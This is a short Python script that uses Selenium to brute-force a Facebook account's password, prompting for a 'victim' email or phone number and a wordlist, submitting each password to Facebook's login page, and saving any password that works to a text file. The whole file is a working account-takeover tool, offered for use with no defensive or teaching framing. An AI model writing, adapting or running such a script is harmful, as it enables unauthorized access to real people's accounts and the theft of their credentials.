from selenium import webdriver
import requests
import time

user_name = input('Enter Victim Email [or] Phone Number : ')
wordlist = input('Enter Your Wordlist Path : ')

browser = webdriver.Firefox(executable_path = 'C:\\geckodriver.exe')

url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'

passwords = open(wordlist).readlines()

for password in passwords:
	browser.get(url)
	fb_pass = password.strip()

	#Email_address
	email = browser.find_element_by_id('email')
	email.send_keys(user_name)

	#Password_Field
	password = browser.find_element_by_id('pass')
	password.send_keys(fb_pass)

	#Login Facebook
	login = browser.find_element_by_id('loginbutton')
	login.submit()

	time.sleep(3)
	cur_url = browser.current_url
	
	if 'login_attempt' not in cur_url:
		print('*'*35)
		print('[+] Password Found : {}'.format(fb_pass))
		print('*'*35)

		file = open('fb_password.txt','w')
		file.write(fb_pass)
		break
	else:
		print('[-] Password Not Found : {}'.format(fb_pass))